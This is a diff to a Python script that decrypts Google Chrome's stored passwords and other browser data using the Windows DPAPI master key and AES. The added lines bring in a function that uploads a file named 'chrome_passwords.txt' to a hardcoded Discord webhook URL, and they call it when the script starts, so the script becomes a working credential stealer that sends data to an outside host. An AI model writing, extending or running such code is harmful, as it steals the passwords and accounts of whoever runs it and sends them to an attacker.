@@ -3,6 +3,7 @@ import json
 import base64
 import shutil
 import sqlite3
+import requests
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
@@ -75,13 +76,29 @@ def get_data(path: str, profile: str, key, type_of_data):
     os.remove('temp_db')
     return result
 
+def send_file_via_webhook(webhook_url, file_path):
+    with open(file_path, 'rb') as file:
+        files = {'file': file}
+        response = requests.post(webhook_url, files=files)
+        
+        if response.status_code == 200:
+            print("Le fichier a été envoyé avec succès via le webhook.")
+        else:
+            print("Une erreur s'est produite lors de l'envoi du fichier via le webhook.")
+            print(f"Code d'état HTTP : {response.status_code}")
+            print(f"Réponse : {response.text}")
+
+webhook_url = "https://discord.com/api/webhooks/1238903244235739307/hlh2RScPrVIobQWdAkllZLfcwCBvJsTdOU_Uk-N01eulkOdjkJzViYP5VpWI6sfsawRU"
+file_path = "chrome_passwords.txt"
 
 if __name__ == '__main__':
     master_key = get_master_key(chrome_path)
     print(f"Getting Stored Passwords from Google Chrome")
+    send_file_via_webhook(webhook_url, file_path)
 
     for data_type_name, data_type in data_queries.items():
         print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
         data = get_data(chrome_path, "Default", master_key, data_type)
         save_results(data_type_name, data)
         print("\t------\n")
+
